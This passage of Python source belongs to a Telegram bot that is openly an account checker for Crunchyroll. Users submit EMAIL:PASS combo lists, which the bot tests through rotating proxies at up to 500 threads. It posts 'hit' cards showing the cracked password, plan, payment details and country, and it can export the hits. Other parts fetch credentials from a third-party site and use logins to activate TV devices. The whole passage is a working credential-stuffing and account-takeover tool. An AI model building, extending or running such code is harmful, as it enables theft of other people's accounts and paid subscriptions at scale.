                logger.warning("Store save failed: %s", e)

    def get_setting(self, key, default=None):
        with self.lock:
            return self.settings.get(key, default)
    def get_admins(self):
        with self.lock:
            return list(self.settings.get("admin_ids", []) or [])
    def add_admin(self, uid: int, username: str = None) -> bool:
        with self.lock:
            ids = list(self.settings.get("admin_ids", []) or [])
            uns = list(self.settings.get("admin_usernames", []) or [])
            if uid and uid not in ids and uid != OWNER_ID:
                ids.append(uid)
                self.settings["admin_ids"] = ids
                if username:
                    uns.append(str(username).lstrip("@"))
                    self.settings["admin_usernames"] = uns
                self.save()
                return True
            elif username and username.lstrip("@").lower() not in [x.lower() for x in uns]:
                uns.append(str(username).lstrip("@"))
                self.settings["admin_usernames"] = uns
                self.save()
                return True
            return False
    def remove_admin(self, uid: int = None, username: str = None) -> bool:
        with self.lock:
            ids = list(self.settings.get("admin_ids", []) or [])
            uns = list(self.settings.get("admin_usernames", []) or [])
            changed = False
            if uid and uid in ids:
                ids.remove(uid)
                self.settings["admin_ids"] = ids
                changed = True
            if username:
                un = str(username).lstrip("@").lower()
                for x in list(uns):
                    if x.lower() == un:
                        uns.remove(x)
                        changed = True
                self.settings["admin_usernames"] = uns
            if changed:
                self.save()
            return changed

    def set_setting(self, key, value):
        with self.lock:
            self.settings[key] = value
            self.save()

    def has_access(self, uid: int):
        with self.lock:
            if uid in ADMIN_IDS:
                return True, now_utc()
            info = self.users.get(str(uid))
            if info:
                exp = parse_iso(info.get("expiry"))
                if exp and exp > now_utc():
                    return True, exp
                self.users.pop(str(uid), None)
                self.save()
            return False, None

    def redeem(self, code: str, uid: int):
        code = (code or "").strip().upper()
        with self.lock:
            data = self.codes.get(code)
            if not data:
                return "invalid"
            if data.get("used_by") is not None:
                return "used"
            exp = parse_iso(data.get("expiry"))
            if not exp or exp < now_utc():
                self.codes.pop(code, None)
                self.save()
                return "expired"
            data["used_by"] = uid
            self.users[str(uid)] = {
                "expiry": data.get("expiry"),
                "premium_only": PREMIUM_ONLY_DEFAULT,
            }
            self.save()
            return exp

    def add_code(self, code: str, hours: int) -> datetime:
        exp = now_utc() + timedelta(hours=hours)
        with self.lock:
            self.codes[code] = {"expiry": exp.isoformat(), "used_by": None}
            self.save()
        return exp

    def set_premium_only(self, uid: int, val: bool):
        with self.lock:
            info = self.users.setdefault(str(uid), {})
            info["premium_only"] = bool(val)
            self.save()

    def get_premium_only(self, uid: int) -> bool:
        with self.lock:
            info = self.users.get(str(uid))
            if info and "premium_only" in info:
                return bool(info["premium_only"])
        return PREMIUM_ONLY_DEFAULT

    def active_user_count(self) -> int:
        with self.lock:
            now = now_utc()
            return sum(
                1 for d in self.users.values()
                if (parse_iso(d.get("expiry")) or datetime.min.replace(tzinfo=timezone.utc)) > now
            )

STORE: Optional[Store] = None

# ===================== PROGRESS =====================
def _bar(pct: int, width: int = 20) -> str:
    filled = int(pct / 100 * width)
    return "█" * filled + "░" * (width - filled)

def _live_feed_block(res: dict) -> str:
    feed = res.get("live_feed") or []
    if not feed:
        return "  <i>—</i>"
    last = feed[-3:]
    return "\n".join(f"  {esc(x)}" for x in last)

def progress_text(res: dict) -> str:
    total = res.get("total") or 0
    processed = res.get("processed", 0)
    raw_pct = (processed / total * 100) if total else 0
    if raw_pct < 10 and raw_pct != 0:
        pct_str = f"{raw_pct:.1f}"
        pct = int(raw_pct)
    else:
        pct_str = str(int(raw_pct))
        pct = int(raw_pct)
    elapsed = res.get("elapsed") or (time.time() - res.get("t0", time.time())) if res.get("t0") else 0
    cpm = res.get("cpm") if res.get("cpm") is not None else _fmt_cpm_smooth(processed, elapsed)
    eta = _fmt_eta(total, processed, cpm)
    elapsed_s = _fmt_duration(elapsed) if elapsed else "0m 0s"
    twofa = res.get("twofa", 0)
    clean_stats = res.get("clean_stats", {})
    legacy = (
        f"⏳ Crunchyroll {pct_str}% [{_bar(pct)}] ({processed}/{total})\n"
        f"✅ Hits: {len(res.get('hits', []))} | 🆓 Free: {len(res.get('free', []))} | "
        f"❌ Bad: {res.get('bad',0)} | ⏳ Rate: {res.get('rate',0)} | ⚠️ Errors: {res.get('err',0)}"
    )
    success_rate = (len(res.get('hits', [])) / processed * 100) if processed else 0
    clean_line = ""
    if clean_stats and clean_stats.get("dup",0) > 0:
        clean_line = f"🧹 Cleaned: <code>{clean_stats.get('cleaned')}</code> • Dup: <code>{clean_stats.get('dup')}</code> • Invalid: <code>{clean_stats.get('invalid')}</code>\n"
    premium = (
        f"╭────────────────────────╮\n"
        f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
        f"╰────────────────────────╯\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"{legacy}\n"
        f"🔐 2FA: <code>{twofa}</code> | 🌐 Proxies: <code>{proxy_count()}</code> | ✅ Rate: <code>{success_rate:.1f}%</code>\n"
        f"{clean_line}"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 <code>{cpm} cpm</code>  🕒 <code>{elapsed_s}</code>  ⏳ ETA <code>{eta}</code>\n"
        f"• Checked: <code>{processed}/{total}</code>  • {pct_str}% • ✅ <code>{len(res.get('hits', []))}</code> hits\n"
        f"📡 <b>Live feed:</b>\n"
        f"{_live_feed_block(res)}"
    )
    return premium

class ProgressReporter:
    def __init__(self, message, loop: asyncio.AbstractEventLoop, interval: float = 1.8, uid: int = None):
        self.message = message
        self.loop = loop
        self.interval = interval
        self.last = 0.0
        self.tasks: List = []
        self.uid = uid

    def update(self, res: dict):
        now = time.time()
        if now - self.last < self.interval:
            return
        self.last = now
        try:
            fut = asyncio.run_coroutine_threadsafe(self._edit(progress_text(res)), self.loop)
            self.tasks.append(fut)
        except Exception:
            pass

    async def _edit(self, text: str):
        try:
            try:
                # show stop + pause buttons, if paused show resume
                is_paused = False
                try:
                    is_paused = bool(PAUSE_REQUEST.get(self.uid)) if self.uid else False
                except:
                    is_paused = False
                if is_paused:
                    kb = _build_kb([[("▶️ Resume", "resumecheck", "success"), ("🛑 Stop", "stopcheck", "danger")]])
                    text = "⏸️ <b>PAUSED</b>\n" + text
                else:
                    kb = _build_kb([[("🛑 Stop", "stopcheck", "danger"), ("⏸️ Pause", "pausecheck", "primary")]])
                await self.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            except BadRequest as e:
                if "message is not modified" in str(e).lower():
                    return
                try:
                    await self.message.edit_text(text, parse_mode=ParseMode.HTML)
                except BadRequest:
                    pass
        except BadRequest:
            pass
        except Exception:
            pass

    def wait(self):
        for t in self.tasks:
            try:
                t.result(timeout=10)
            except Exception:
                pass
        self.tasks.clear()

# ===================== FORMATTING =====================
def access_denied_html() -> str:
    return (
        "✅ <b>Free Bot</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "This bot is FREE — no code needed!\n"
        "Just tap <b>💎 Check Account</b> to start.\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
    )

def hit_card(entry: dict) -> str:
    cred, d = entry["cred"], entry.get("data") or {}
    L = []
    L.append("⭐ <b>CRUNCHYROLL HIT!</b>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    if cred["type"] == "email":
        L.append(f"📧 Email: <code>{esc(cred['value'])}</code>")
        L.append(f"🔑 Password: <code>{esc(cred.get('password', ''))}</code>")
    else:
        L.append(f"🔑 {cred['type'].title()}: <code>{esc(cred['value'][:60])}</code>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    plan = d.get("plan") or "Premium"
    L.append(f"• Plan: <code>{esc(plan)}</code>")
    L.append(f"• Premium: ✅")
    if d.get("expiry") or d.get("next_renewal"):
        L.append(f"• Expiry: <code>{esc(d.get('expiry') or d.get('next_renewal') or 'N/A')}</code>")
    if d.get("days_left"):
        L.append(f"• Days Left: <code>{esc(str(d.get('days_left')))}</code>")
    L.append(f"• Auto Renew: {'✅' if d.get('renew') else '❌'}")
    L.append(f"• Free Trial: {'✅' if d.get('trial') else '❌'}")
    if d.get("duration") or d.get("billing_cycle"):
        L.append(f"• Plan Duration: <code>{esc(d.get('duration') or d.get('billing_cycle') or 'N/A')}</code>")
    price = str(d.get("price") or "0")
    if d.get("currency"):
        price += f" {d.get('currency')}"
    L.append(f"• Plan Price: <code>{esc(price.strip())}</code>")
    if d.get("plan_type"):
        L.append(f"• Plan Type: <code>{esc(d.get('plan_type'))}</code>")
    L.append(f"• Email Verified: {'✅' if d.get('verified') else '❌'}")
    if d.get("created") or d.get("start_date"):
        L.append(f"• Created Date: <code>{esc(d.get('created') or d.get('start_date') or 'N/A')}</code>")
    if d.get("payment") or d.get("payment_method"):
        L.append(f"• Last Payment: <code>{esc(d.get('payment') or d.get('payment_method') or 'N/A')}</code>")
    if d.get("cc") or d.get("country_name"):
        flag = flag_emoji(d.get("cc"))
        country = d.get("country_name") or d.get("cc") or "N/A"
        L.append(f"• Country: {flag + ' ' if flag else ''}<code>{esc(country)}</code>")
    if d.get("streams"):
        L.append(f"• Streams: <code>{esc(str(d.get('streams')))}</code>")
    if d.get("user") and d["user"] != (cred.get("value", "").split("@")[0] if cred.get("value") else ""):
        L.append(f"• User: <code>{esc(d.get('user'))}</code>")
    if d.get("sub_id"):
        L.append(f"• Sub ID: <code>{esc(d.get('sub_id')[:20])}</code>")
    if d.get("response_time"):
        L.append(f"• Speed: <code>{esc(d.get('response_time'))}</code>")
    L.append("━━━━━━━━━━━━━━━━━━━━━")
    L.append("🔥 <b>CRUNCHYROLL</b>")
    L.append(DEVELOPER_BRANDING)
    return "\n".join(L)

def summary_text(res: dict) -> str:
    hits = len(res.get('hits', []))
    free = len(res.get('free', []))
    bad = res.get('bad', 0)
    rate = res.get('rate', 0)
    err = res.get('err', 0)
    twofa = res.get('twofa', 0)
    total = res.get('total', 0)
    processed = res.get('processed', 0)
    sec = res.get('seconds', '?')
    cpm = res.get('cpm', 0)
    elapsed = res.get('elapsed', 0)
    if not cpm and elapsed:
        cpm = _fmt_cpm_smooth(processed, elapsed)
    legacy = (
        f"📊 Total: <code>{total}</code> | Processed: <code>{processed}</code>\n"
        f"✅ Hits: <code>{hits}</code> | 🆓 Free: <code>{free}</code> | "
        f"❌ Bad: <code>{bad}</code>\n"
        f"⏳ Rate: <code>{rate}</code> | ⚠️ Errors: <code>{err}</code>\n"
        f"⏱ Time: <code>{sec}s</code> | 🌐 Live Proxies: <code>{proxy_count()}</code>"
    )
    extra = f"🔐 2FA: <code>{twofa}</code> | 📈 Avg: <code>{cpm} cpm</code>" if twofa or cpm else ""
    extra_block = f"{extra}\n" if extra else ""
    detailed = ""
    if res.get("hits"):
        plans = Counter((h.get("data") or {}).get("plan") or "Premium" for h in res.get("hits", []))
        plan_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in plans.items())
        ccs = Counter((h.get("data") or {}).get("country_name") or (h.get("data") or {}).get("cc") or "Unknown" for h in res.get("hits", []))
        cc_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in ccs.most_common(3))
        total2 = res.get("total", 0) or 1
        rate2 = len(res.get("hits", [])) / total2 * 100
        detailed = (
            f"📊 Plans: {plan_line}\n"
            f"🌍 Countries: {cc_line}\n"
            f"✅ Success: <code>{rate2:.1f}%</code> • ⏱ Avg: <code>{res.get('cpm',0)} cpm</code>\n"
        )
    clean_stats = res.get("clean_stats", {})
    clean_block = ""
    if clean_stats:
        clean_block = f"🧹 Cleaned: <code>{clean_stats.get('cleaned')}</code> Dup: <code>{clean_stats.get('dup')}</code> Invalid: <code>{clean_stats.get('invalid')}</code>\n"
    return (
        "╭────────────────────────╮\n"
        "│ ✅ <b>SCAN COMPLETE!</b> │\n"
        "╰────────────────────────╯\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"{legacy}\n"
        f"{extra_block}"
        f"{clean_block}"
        f"{detailed}"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>CRUNCHYROLL</b>\n"
        f"{DEVELOPER_BRANDING}"
    )

def status_text() -> str:
    ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
    daily = load_daily_stats()
    return (
        "📊 <b>Bot Status</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Owner: <code>{esc(OWNER_USERNAME)}</code>\n"
        f"🌐 Live Proxies: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n"
        f"   ↳ Auto: <code>{len(AUTO_PROXY_URLS)}</code> | Manual: <code>{len(MANUAL_PROXY_URLS)}</code>\n"
        f"⚙️ Auto-Check: <code>{'ON' if ac else 'OFF'}</code> | Auto-Load: <code>{'ON' if STORE.get_setting('auto_proxy', True) else 'OFF'}</code>\n"
        f"👥 Active Users: <code>{STORE.active_user_count() if STORE else 0}</code> | Banned: <code>{len(BANNED_USERS)}</code>\n"
        f"🧵 Threads: <code>{THREADS}</code> (max {MAX_THREADS_USER})\n"
        f"🔁 Proxy Refresh: <code>{PROXY_REFRESH_MINUTES} min</code> | Timeout: <code>{PROXY_TEST_TIMEOUT}s</code>\n"
        f"⏱ Uptime: <code>{uptime()}</code>\n"
        f"✅ Checks Session: <code>{CHECKS_DONE}</code> | Hits: <code>{TOTAL_HITS}</code>\n"
        f"📅 Today: <code>{daily.get('hits',0)} hits / {daily.get('checks',0)} checks / {daily.get('total',0)} scans</code>\n"
        f"🧩 SOCKS5: <code>{'Yes' if SOCKS5_OK else 'No'}</code> | Flask: <code>{'Yes' if FLASK_OK else 'No'}</code>\n"
        f"💾 Scores: <code>{len(PROXY_SCORES)}</code> | CPM Avg: <code>{int(sum(CPM_HISTORY)/len(CPM_HISTORY)) if CPM_HISTORY else 0}</code>\n"
        f"💎 Mode: <code>{'Premium Only' if PREMIUM_ONLY_DEFAULT else 'All'}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"{DEVELOPER_BRANDING}"
    )

def help_text() -> str:
    return (
        "╭────────────────────────╮\n"
        "│  📖 <b>HELP</b>  │\n"
        "╰────────────────────────╯\n"
        "🔥 <b>Crunchyroll Checker</b> — Powerful, Secure, Fast\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "👑 <b>Owner + Admins Only</b> • 24x7 Auto Proxy • 500 Threads • Smart Scoring\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "┌─ <b>🚀 QUICK START</b> ──────────┐\n"
        "│ 💎 <b>Check Account</b> → Paste <code>EMAIL:PASS</code>\n"
        "│   └ One per line • Ex: <code>a@b.com:pass123</code>\n"
        "│ 📂 <b>Check File</b> → Send <code>.txt/.csv/.log/.json</code>\n"
        "│   └ Auto-extracts 10k+ lines 📦\n"
        "│ 🧹 <b>Clean Combos</b> → Dedup + Clean\n"
        "│ ⏳ LIVE scan → Hits <b>instant</b> ⚡ + <code>TXT+JSON+CSV</code> export\n"
        "└────────────────────────┘\n"
        "┌─ <b>🎛️ BUTTONS</b> ─────────────┐\n"
        "│ 💎 Check • 📂 File • 🧹 Clean\n"
        "│ 📖 Help • 📊 Stats • 🛠️ Tools\n"
        "│ ⚙️ Proxy Settings (Proxies/Threads/Auto)\n"
        "│ 👥 Admins (Owner only: Add/Remove/Ban)\n"
        "└────────────────────────┘\n"
        "┌─ <b>⌨️ COMMANDS</b> ────────────┐\n"
        "│ <code>/start</code> — Main menu\n"
        "│ <code>/cmds</code> / <code>/help</code> — This help\n"
        "│ <code>/proxy</code> — Proxy Settings\n"
        "│ <code>/addproxy</code> — Upload proxies (text/file/URL)\n"
        "│ <code>/clearproxy</code> — Clear pool\n"
        "│ <code>/threads</code> — Set 50/100/200/300/500\n"
        "│ <code>/autoproxy</code> — Toggle 24x7 auto\n"
        "│ <code>/clean</code> — Clean combos file\n"
        "│ <code>/stop</code> — Stop check\n"
        "│ <code>/pause</code> / <code>/resume</code> — Pause/Resume\n"
        "│ <code>/stats</code> — Detailed stats\n"
        "│ <code>/history</code> — Last checks\n"
        "│ <code>/admins</code> — List admins\n"
        "│ <code>/addadmin 123</code> / <code>@user</code> — Owner\n"
        "│ <code>/removeadmin 123</code> / <code>@user</code>\n"
        "│ <code>/ban 123</code> / <code>/unban 123</code> — Owner\n"
        "│ <code>/broadcast msg</code> — Owner broadcast\n"
        "└────────────────────────┘\n"
        "┌─ <b>⚙️ PROXY SYSTEM v2</b> ────────┐\n"
        "│ ♻️ Auto: 12 sources, 5min, 500 live, watchdog 45s\n"
        "│ 📥 Manual: <code>ip:port</code> / <code>user:pass@ip:port</code>\n"
        "│   Text/file/URL — auto-detect + scoring\n"
        "│ 🧵 Threads 50/100/200/300/500 • Smart scoring\n"
        "│ 📊 Proxy Scores persistent • Auto discard auto only\n"
        "└────────────────────────┘\n"
        "┌─ <b>🎯 CHECKER v2</b> ────────────┐\n"
        "│ 150 default → 500 max • 800-1000 cpm\n"
        "│ Deep: Fan/Mega/Ultimate • Expiry/Price/Trial\n"
        "│ 2FA/Rate/Errors handled • Instant hits\n"
        "│ Retry with new proxy • Clean/Dedup • Pause/Resume\n"
        "│ Daily stats • History • CPM smoothing\n"
        "└────────────────────────┘\n"
        "╭────────────────────────╮\n"
        "│  🔥 <b>CRUNCHYROLL</b> • UPGRADED  │\n"
        "╰────────────────────────╯\n"
        f"{DEVELOPER_BRANDING} • 👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
    )

def welcome_premium_text(uid: int, name: str) -> str:
    try:
        owner_flag = is_owner(uid)
    except Exception:
        owner_flag = (uid == OWNER_ID)
    if owner_flag:
        access_line = "👑 <b>Owner</b> • <code>Unlimited</code> ♾️"
    else:
        try:
            if is_admin(uid, name):
                access_line = "✅ <b>Admin Access</b> • <code>Unlimited</code> 🎉"
            else:
                access_line = "✅ <b>Free Access</b> • <code>Unlimited</code> 🎉"
        except Exception:
            access_line = "✅ <b>Free Access</b> • <code>Unlimited</code> 🎉"
    daily = load_daily_stats()
    return (
        "╭────────────────────────╮\n"
        "│  🔥 <b>CRUNCHYROLL</b> 🔥  │\n"
        "│  <i>Premium Checker • UPGRADED</i>   │\n"
        "╰────────────────────────╯\n"
        f"👋 Hey <b>{esc(name)}</b>\n"
        f"{access_line}\n"
        "┌─ <b>STATS</b> ────────────────┐\n"
        f"│ 🌐 Proxies: <code>{proxy_count()} live</code> • 📦 Pool: <code>{pool_size()}</code>\n"
        f"│   ↳ Auto: <code>{len(AUTO_PROXY_URLS)}</code> Manual: <code>{len(MANUAL_PROXY_URLS)}</code>\n"
        f"│ 👥 Users: <code>{STORE.active_user_count() if STORE else 0}</code> • 🧵 Threads: <code>{THREADS}</code> (max 500)\n"
        f"│ ⏱ Uptime: <code>{uptime()}</code> • ✅ Checks: <code>{CHECKS_DONE}</code> Hits: <code>{TOTAL_HITS}</code>\n"
        f"│ 📅 Today: <code>{daily.get('hits',0)} hits / {daily.get('total',0)} scans</code>\n"
        "└────────────────────────┘\n"
        "👇 <i>Choose an action — buttons below</i> 👇\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"{DEVELOPER_BRANDING}"
    )

# ===================== BUTTON MENUS =====================
CUSTOM_EMOJI_ID = "5319302927281177662"
_CAPS = {"icon": None, "style": None}
PREMIUM_EMOJI = {}

def _premium_wrap(text: str) -> str:
    return text

BLAZENXT_RIBBON = ""
BLAZENXT_BRAND = "<b>BlazeNXT</b>"
DEVELOPER_BRANDING = 'Developed by : <a href="https://t.me/blaze_nxt">BlazeNXT</a>'

def _build_kb(rows) -> InlineKeyboardMarkup:
    use_style = _CAPS["style"] is not False
    data = []
    for row in rows or []:
        line = []
        for item in row:
            if not item:
                continue
            label = item[0]
            cb = item[1] if len(item) > 1 else None
            style = item[2] if len(item) > 2 else None
            kwargs = {}
            is_url = isinstance(cb, str) and (cb.startswith("tg://") or cb.startswith("https://") or cb.startswith("http://"))
            if style and use_style and style in ("primary","success","danger") and not is_url:
                kwargs["style"] = style
            if is_url:
                line.append(InlineKeyboardButton(label, url=cb, **kwargs))
            else:
                line.append(InlineKeyboardButton(label, callback_data=cb, **kwargs))
        if line:
            data.append(line)
    return InlineKeyboardMarkup(data)

async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
    text = text
    for _attempt in range(4):
        use_icon = _CAPS["icon"] is not False
        use_style = _CAPS["style"] is not False
        kb = _build_kb(rows)
        try:
            if edit:
                await msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            else:
                await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            if use_icon:
                _CAPS["icon"] = True
            if use_style:
                _CAPS["style"] = True
            return True
        except BadRequest as e:
            s = str(e).lower()
            if "message is not modified" in s:
                return True
            if use_icon and ("emoji" in s or "icon" in s):
                _CAPS["icon"] = False
                continue
            if use_style and "style" in s:
                _CAPS["style"] = False
                continue
            logger.warning("menu send failed: %s", e)
            return False
    return False

async def reply_menu(msg, text, rows):
    return await _send_menu(msg, text, rows, edit=False)

async def edit_menu(msg, text, rows):
    return await _send_menu(msg, text, rows, edit=True)

def _build_reply_kb(rows, resize=True, one_time=False):
    return None
def main_reply_kb(is_owner: bool):
    return None
def owner_reply_kb():
    return None
def gen_reply_kb():
    return None
REPLY_TEXT_MAP = {}

async def _send_reply_menu(msg, text: str, reply_kb, inline_rows=None):
    return False
async def _edit_or_send_reply(msg, text: str, reply_kb):
    return False

PENDING: Dict[int, dict] = {}
PENDING_LOCK = threading.Lock()

def set_pending(uid: int, kind: str, **kw):
    with PENDING_LOCK:
        PENDING[uid] = {"kind": kind, **kw}

def get_pending(uid: int):
    with PENDING_LOCK:
        return PENDING.get(uid)

def clear_pending(uid: int):
    with PENDING_LOCK:
        PENDING.pop(uid, None)

def _has_access(uid: int, username: str = None) -> bool:
    try:
        return is_admin(uid, username)
    except Exception:
        try:
            return is_admin(uid)
        except Exception:
            return False

def _is_owner(uid: int, username: str = None) -> bool:
    try:
        if uid and OWNER_ID and uid == OWNER_ID:
            return True
    except Exception:
        pass
    try:
        if username and OWNER_USERNAME:
            if str(username).lstrip("@").lower() == OWNER_USERNAME.lstrip("@").lower():
                return True
    except Exception:
        pass
    return False

# ===================== MENU DEFINITIONS v1 =====================
AIO_SERVICES = [
    [("🍥 CRUNCHYROLL", "check", "success")],
]

def menu_main(uid: int, username: str = None):
    try:
        header = welcome_premium_text(uid, str(username or uid))
    except Exception:
        header = "╭────────────────────────╮\n│  🔥 <b>CRUNCHYROLL</b> 🔥  │\n╰────────────────────────╯"
    rows = [
        [("💎 Check Account", "check", "success"), ("📂 Check File", "file", "primary")],
        [("🧹 Clean Combos", "cleancombos", "primary"), ("🛠️ Tools", "tools", "primary")],
        [("📖 How To Use", "help", "primary"), ("📊 Bot Stats", "status", "primary")],
        [("⚙️ Proxy Settings", "proxysettings", "primary")],
    ]
    try:
        if is_owner(uid) or uid == OWNER_ID:
            rows.append([("👥 Admins", "admins", "primary")])
    except Exception:
        if uid == OWNER_ID:
            rows.append([("👥 Admins", "admins", "primary")])
    return header, rows

def menu_owner():
    auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
    daily = load_daily_stats()
    header = (
        "⚙️ <b>Proxy Settings — Auto Load 100x Fast</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Status: <code>{'ON' if proxy_count() else 'OFF'}</code> • 📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n"
        f"   ↳ Auto: <code>{len(AUTO_PROXY_URLS)}</code> • Manual: <code>{len(MANUAL_PROXY_URLS)}</code> • Scores: <code>{len(PROXY_SCORES)}</code>\n"
        f"🔄 Auto Load: <code>{'ON' if auto_on else 'OFF'}</code> • 🧵 Threads: <code>{THREADS}</code> (max {MAX_THREADS_USER})\n"
        f"⚡ Speed: <code>100x Fast</code> • 1:1 Proxy per Account • Retry 2x\n"
        f"📅 Today: <code>{daily.get('hits',0)} hits / {daily.get('total',0)} scans</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Format: <code>user:pass@ip:port</code> or <code>ip:port</code> or URL\n"
        "Auto: 12 sources • Manual: text/file/URL"
    )
    rows = [
        [("🔄 Refresh Auto", "refresh", "primary"), ("📥 Upload Proxies", "addpx", "success")],
        [("🌐 Import URL", "importurl", "primary"), ("📊 Proxy Stats", "proxystats", "primary")],
        [("❌ Disable Proxies", "disableproxies", "danger"), ("🧹 Clear Proxies", "clearpool", "danger")],
        [("🔄 Auto Load: ON" if auto_on else "⏸️ Auto Load: OFF", "autoproxy", "primary"), ("🧵 Set Threads", "setthreads", "primary")],
        [("⬅️ Back", "menu", "danger")],
    ]
    return header, rows

def menu_tools():
    header = (
        "🛠️ <b>Tools</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🧹 Clean Duplicates • 📊 Stats • 📜 History\n"
        "🌐 Proxy Tools • 📁 Export • ⚙️ Settings\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 Live: <code>{proxy_count()}</code> • Pool: <code>{pool_size()}</code>\n"
        f"🧵 Threads: <code>{THREADS}</code> • Uptime: <code>{uptime()}</code>\n"
    )
    rows = [
        [("🧹 Clean Duplicates", "cleandup", "primary"), ("📊 Daily Stats", "dailystats", "primary")],
        [("📜 Check History", "history", "primary"), ("📊 Proxy Stats", "proxystats", "primary")],
        [("📁 Export Hits", "exporthits", "success"), ("📁 Export All", "exportall", "primary")],
        [("⚙️ Settings", "settings", "primary"), ("⬅️ Back", "menu", "danger")],
    ]
    return header, rows

# ===================== TV / OXAAM WORKERS =====================
def _tv_do(email, pw, code):
    j, st = app_login(email, pw)
    if not j:
        return False, f"login_failed ({st})"
    return activate_tv(j["access_token"], code)

def _oxaam_do():
    proxy = get_random_proxy() if "get_random_proxy" in globals() else None
    email, pw = oxaam_fetch(proxy)
    if (not email or not pw) and proxy:
        logger.info("Oxaam retry without proxy")
        email, pw = oxaam_fetch(None)
    if not email or not pw:
        return None, None, None
    try:
        r = check_credential({"type": "email", "value": email, "password": pw}, get_random_proxy())
    except Exception as e:
        r = {"st": "err", "data": {"info": str(e)}}
    return email, pw, r

def _oxaam_report(email, pw, res) -> str:
    head = f"🔐 <code>{esc(email)}:{esc(pw)}</code>\n\n"
    if res and res.get("st") == "hit":
        return head + hit_card({"cred": {"type": "email", "value": email, "password": pw},
                                "data": res["data"]})
    st = (res or {}).get("st", "err") if res else "no_cred"
    info = (res or {}).get("data", {}).get("info", "") if res else "oxaam_empty"
    if st == "no_cred" or not email:
        return (
            "❌ <b>Oxaam Fetch Failed</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ Could not extract from Oxaam.\n"
            "• Site may be slow or blocked — try again in 30s\n"
            "• Try <b>📡 Refresh Proxies</b> then retry\n"
            "• Or use <b>💎 Check Account</b> with your own combos\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔍 Debug: <code>{esc(info) or 'no_html'}</code>\n"
            "🔥 <b>CRUNCHYROLL</b> 🎀"
        )
    return head + f"⚠️ Extracted, but check result: <code>{esc(st)}</code> {esc(info)}\n🔥 <b>CRUNCHYROLL</b> 🎀"

# ===================== HIT CARDS =====================
async def send_hit_cards(msg, entries: List[dict], cap: int = MAX_HIT_CARDS) -> int:
    sent = 0
    for e in entries[:cap]:
        card = hit_card(e)
        for _ in range(2):
            try:
                await msg.reply_text(card, parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.4)
                break
            except RetryAfter as fw:
                ra = fw.retry_after
                ra = ra.total_seconds() if hasattr(ra, "total_seconds") else float(ra)
                await asyncio.sleep(ra + 0.3)
            except Exception:
                return sent
    return sent

# ===================== CHECK RUNNER v1 =====================
async def _run_and_report(msg, uid: int, text: str):
    if uid in BANNED_USERS:
        await reply_menu(msg, "🚫 <b>You are banned</b> from using this bot.", [[("⬅️ Back", "menu", "danger")]])
        return

    with USER_LOCK:
        now = time.time()
        last = USER_LAST_CHECK.get(uid, 0)
        if now - last < 3:  # reduced from 5 to 3 sec for faster UX
            await reply_menu(msg, "⏳ <b>Slow down</b> — wait 3 sec between checks.", [[("⬅️ Back", "menu", "danger")]])
            return
        if USER_LAST_CHECK.get(f"busy_{uid}"):
            # queue system: if busy, offer to queue or stop
            await reply_menu(msg, "⏳ <b>Busy</b> — one check at a time.\n\nUse 🛑 Stop Check to cancel current.", [[("🛑 Stop Check", "stopcheck", "danger"), ("⬅️ Back", "menu", "danger")]])
            return
        USER_LAST_CHECK[f"busy_{uid}"] = True
        USER_LAST_CHECK[uid] = now
        STOP_REQUEST.pop(uid, None)
        PAUSE_REQUEST.pop(uid, None)
        ACTIVE_CHECK_MSG.pop(uid, None)

    # clean stats preview
    try:
        _, clean_preview = clean_combos(text)
    except:
        clean_preview = {"cleaned": 0, "dup": 0}

    line_count = max(1, text.count("\n") + 1)
    creds_preview = len(extract_credentials(text))
    init_card = (
        f"╭────────────────────────╮\n"
        f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
        f"╰────────────────────────╯\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 Lines: <code>{line_count}</code> • 🎯 Combos: <code>{creds_preview}</code> • 🧹 Clean: <code>{clean_preview.get('cleaned',0)}</code> Dup: <code>{clean_preview.get('dup',0)}</code>\n"
        f"⏳ Crunchyroll 0% [░░░░░░░░░░░░░░░░░░░░] (0/{creds_preview})\n"
        f"⭐ Hits: <code>0</code> | 🆓 Free: <code>0</code> | 🔐 2FA: <code>0</code> | ❌ Bad: <code>0</code> | ⚠️ Errors: <code>0</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 <code>0 cpm</code>  🕒 <code>0m 0s</code>  ⏳ ETA <code>—</code> | 🧵 <code>{THREADS}</code>\n"
        f"📡 <b>Live feed:</b> • <i>starting…</i>"
    )
